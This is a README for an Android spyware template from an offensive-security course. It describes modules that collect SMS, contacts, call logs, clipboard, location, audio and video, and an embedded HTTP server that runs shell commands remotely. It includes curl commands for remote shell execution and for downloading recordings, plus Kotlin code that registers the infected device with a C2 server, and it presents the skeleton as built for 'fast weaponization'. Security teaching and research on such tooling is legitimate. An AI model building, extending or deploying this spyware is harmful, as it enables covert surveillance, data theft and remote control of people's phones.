# 🕵️‍♂️ Spyware Skeleton – Android Offensive Framework
This repository is part of the *Offensive Android Programming* course by Mobile Hacking Lab (MHL).

It provides a modular and extensible structure with basic offensive capabilities, intended for educational use and security research in controlled environments.

## 💼 Features
- 📞 Retrieve Call Logs  
- 📇 Access Contacts  
- 📋 Extract Clipboard Data  
- 💬 Read SMS  
- 🎙️ Audio Recording  
- 📹 Video Recording  
- 📍 Get Location Data  
- 🧪 Execute Shell Commands  
- 🌐 Embedded HTTP Server (NanoHTTPD)

## 🌐 Local Web Server
A built-in `NanoHTTPD` server runs on port `1234` inside the `MyForegroundService`. This allows **remote data exfiltration and control via HTTP**.

### Endpoints:
| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/?command=GET_CONTACTS` | Dump all contacts |
| `GET` | `/?command=GET_CALL_LOGS` | Dump call history |
| `GET` | `/?command=GET_SMS` | Retrieve all SMS |
| `GET` | `/?command=GET_CLIPBOARD` | Get current clipboard |
| `GET` | `/?command=GET_LOCATION` | Get last known location |
| `POST` | `/?command=EXECUTE` | Execute shell command |
| `POST` | `/?command=AUDIO_RECORD` | Start audio recording |
| `GET` | `/?command=AUDIO_STOP` | Stop and download last audio |
| `POST` | `/?command=VIDEO_START` | Start video recording |
| `GET` | `/?command=VIDEO_STOP` | Stop and download last video |

### 🐚 Shell Command Execution (Example):
```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"whoami"}' \
  http://<DEVICE_IP>:1234/?command=EXECUTE
```
### 🎙️ Start Audio Recording:
```bash
curl -X POST http://<DEVICE_IP>:1234/?command=AUDIO_RECORD
```
### 🎙️ Stop and Download Audio:
```bash
curl -X GET http://<DEVICE_IP>:1234/?command=AUDIO_STOP --output dump.3gp
```
### 📹 Start Video Recording (Front or Back):
```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"cameraDirection":"front"}' \
  http://<DEVICE_IP>:1234/?command=VIDEO_START
```
### 📹 Stop and Download Video:
```bash
curl -X GET http://<DEVICE_IP>:1234/?command=VIDEO_STOP --output video.mp4
```

## CONFIGURATION
### ✅ Network Security
To allow HTTP communication on newer Android versions (API 28+), create the following file:
`res/xml/network_security_config.xml`
```XML
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">192.168.1.97</domain> <!-- 🔁 Replace with your C2 server IP -->
    </domain-config>
</network-security-config>
```
And reference it in your manifest:
```XML
<application
    android:networkSecurityConfig="@xml/network_security_config"
    ... >
```
### 🔁 Notify Your C2 Server
The app will periodically notify your remote server with its IP and port:
`Server.kt`
```Kotlin
private fun notifyFlaskServer() {
    val ip = getLocalIpAddress()
    val url = "http://192.168.1.97:4444/register" // 🔁 Change this
    val payload = JSONObject().apply {
        put("ip", ip)
        put("port", "1234")
    }
    ...
}
```
Update the IP and port to match your Flask or custom C2 server.

## 🧠 Structure
The code is organized under com.lautaro.spyware, with clean modules and retrievers:
- GetSms, ContactsRetriever, CallLogsRetriever, etc.
- ShellCommandExecutor, AudioRecorder, VideoRecord
- MyForegroundService + Server.kt (embedded HTTP server)

All designed for modularity, reusability and fast weaponization.

## 🚀 Usage
- Import the project into **Android Studio**
- Deploy to a test device (emulator or real)
- **Trigger any component manually or via HTTP**

This repository is meant to be a template/skeleton, not a standalone spyware app. Extend it freely.

## ⚠️ Disclaimer
**This project is intended strictly for educational and ethical hacking purposes**.
Do not deploy or use this code against any device or user without explicit consent.
**The authors are not responsible for any misuse**.
